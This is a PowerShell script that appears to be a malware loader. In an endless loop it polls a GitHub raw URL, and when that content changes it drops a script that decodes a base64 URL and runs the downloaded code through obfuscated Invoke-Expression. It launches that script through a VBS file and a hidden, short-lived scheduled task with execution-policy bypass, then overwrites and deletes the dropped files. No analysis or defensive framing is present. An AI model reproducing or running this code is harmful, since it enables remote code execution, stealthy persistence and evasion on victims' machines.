function Execu {
    Param ($com,$arg)    
    if (!($arg)) {
        $arg = " "
    }
    $rnd = Get-Random
    $tn = $rnd
    $gde = Get-Date ;
    $gd = $gde.AddMinutes(1)
    $hr = $gd.hour 
    $mn = $gd.Minute
    if ($hr -lt 10 ) {$hr = "0$hr"}
    if ($mn -lt 10 ) {$mn = "0$mn"}
    $st = "$hr-$mn".Replace("-",":")    
    $yr = $gd.Year    ;    $m = $gd.Month
    if ($m -gt 9){ $mon = $m } else { $mon = "0$m" } ; $d = $gd.Day
    $time = "$yr-$mon-$d%T$st%:00".Replace("%","")
    $date = "2024-01-01T16:20:00" ; $st = $time
    $file = $com ; $arguments = $arg
    $xmlpa = "C:\Windows\System32\Tasks\$tn"
    "[+] TASKNAME`t$tn"
    "[+] COMMAND`t$file"
    "[+] ARGUMENTS`t$arguments"
    "[+] START TIME`t$ST"
    "[+] PATH $xmlpa"
    try {  $tim = $gd.ToShortTimeString()
        $act = New-ScheduledTaskAction -Execute $file  -Argument  $arguments
        $tri = New-ScheduledTaskTrigger -Once -At $tim
        <# $tri = New-ScheduledTaskTrigger -Daily -At $tim  -RepetitionInterval  (New-TimeSpan -Minutes 10) #>
        $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries 
        Register-ScheduledTask -Action $act -Trigger $tri -Settings $set  -TaskName $tn | Out-Null
    } catch { $xmlc = "<?xml version=`"1.0`" encoding=`"UTF-16`"?>`n<Task version=`"1.2`" xmlns=`"http://schemas.microsoft.com/windows/2004/02/mit/task`">`n  <RegistrationInfo>`n    <Date>$date</Date>`n    <Author>$env:computername\$env:username</Author>`n    <URI>\$TN</URI>`n  </RegistrationInfo>`n  <Triggers>`n    <TimeTrigger>`n      <StartBoundary>$ST</StartBoundary>`n      <Enabled>true</Enabled>`n    </TimeTrigger>`n  </Triggers>`n  <Settings>`n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>`n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>`n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>`n    <AllowHardTerminate>false</AllowHardTerminate>`n    <StartWhenAvailable>true</StartWhenAvailable>`n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>`n    <IdleSettings>`n      <Duration>PT10M</Duration>`n      <WaitTimeout>PT1H</WaitTimeout>`n      <StopOnIdleEnd>true</StopOnIdleEnd>`n      <RestartOnIdle>false</RestartOnIdle>`n    </IdleSettings>`n    <AllowStartOnDemand>true</AllowStartOnDemand>`n    <Enabled>true</Enabled>`n    <Hidden>true</Hidden>`n    <RunOnlyIfIdle>false</RunOnlyIfIdle>`n    <WakeToRun>false</WakeToRun>`n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>`n    <Priority>7</Priority>`n  </Settings>`n  <Actions Context=`"Author`">`n    <Exec>`n    <Command>$file</Command>`n    <Arguments>$arguments</Arguments>`n    </Exec>`n  </Actions>`n  <Principals>`n    <Principal id=`"Author`">`n      <UserId>$env:computername\$env:username</UserId>`n      <LogonType>InteractiveToken</LogonType>`n      <RunLevel>LeastPrivilege</RunLevel>`n    </Principal>`n  </Principals>`n</Task>"
        $xmlc > $xmlpa
        try { C:\Windows\System32\schtasks.exe /create /XML $xmlpa /tn $tn /f   } catch { C:\Windows\System32\schtasks.exe /create /tn $tn /tr "$file $arguments" /SC DAILY /ST $st /f }            
    }
    sleep 85 ; try{ C:\Windows\System32\schtasks.exe /delete /tn $tn /f } catch {} 
}

Function git {
    try { $con = $w.DownloadString($rl) } catch { $con = Iwr -UseBasicParsing  -Uri $rl }

    if (!([string]::isnullorEmpty($con))) {
            
        $pak = "$env:????????p??????\MPackages"
        $chq = "$pak\IconCache"
        
        if (!($b.folderExists($pak))){
            md $pak | Out-Null
        }

        if (test-path $chq){
            "Exists $chq"
            [int]$red = [System.IO.File]::ReadAllText($chq)
        } else {
            $red = 0
        }

        $led = $con.length

        "RED $red`nLED $LED"
        if ($red -ne $led){

            "[+] Execute New Code "
            [System.IO.File]::WriteAllText($chq,$led)
    
$filess = @'
$w = New-Object System.Net.WebClient
$s = New-Object -ComObject Wscript.Shell
$e = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1M0TVMzUC9YWFgvbWFpbi9JRVhE"))
$c = $w.DownloadString($e)
if (!([string]::isnullorempty($c))) {
    .([char]105+[char]101+[char]120) $c
}
'@
            $rnd = Get-Random

            $fiex = "$env:public\$rnd.ps1"
            $viex = "$env:public\$rnd.vbs"
            
            $vbs = "On Error Resume Next : Randomize  : b = Round(Rnd * 100) / Round(Rnd * 10000) : set s = CreateObject(`"wscript.Shell`") : s.run  `"cmd.exe /c powershell.exe -noexit -exec bypass -f $fiex `" , 1"

            [System.IO.File]::WriteAllText($fiex,$filess)
            [System.IO.File]::WriteAllText($viex,$vbs)

            Execu -com "C:\Windows\System32\wscript.exe" -arg "$viex"
            sdel -path $viex
            sdel -path $fiex

        } else {
            "[-] Execute NO New Code "
        }
    } else {
        sleep 10
    }    
}

function sdel{
    Param($path)
    if (test-path $Path) {
        $rnd > $path
        del $path -Force
    }
}

$rl = "https://raw.githubusercontent.com/S4MS3P/XXX/main/IEXD"
$sh = New-Object -ComObject Wscript.Shell 
$w = New-Object System.Net.WebClient
$b = New-Object -ComObject Scripting.FileSystemObject
$rnd = Get-Random
$me = $MyInvocation.MyCommand.path

#onet

while (1) {
    git
    sleep 15
}

